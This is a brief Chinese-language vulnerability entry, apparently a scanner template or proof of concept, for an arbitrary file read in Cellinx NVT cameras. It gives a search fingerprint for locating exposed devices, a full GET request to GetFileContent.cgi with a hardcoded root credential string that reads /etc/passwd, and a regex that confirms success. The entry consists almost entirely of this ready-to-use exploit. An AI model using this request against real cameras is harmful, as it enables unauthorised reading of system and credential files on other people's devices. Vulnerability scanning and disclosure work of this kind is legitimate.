# CellinxNVT摄像机GetFileContent.cgi任意文件读取漏洞

CellinxNVT ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="local/NVT-string.js"`
- **请求**：`GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605 HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$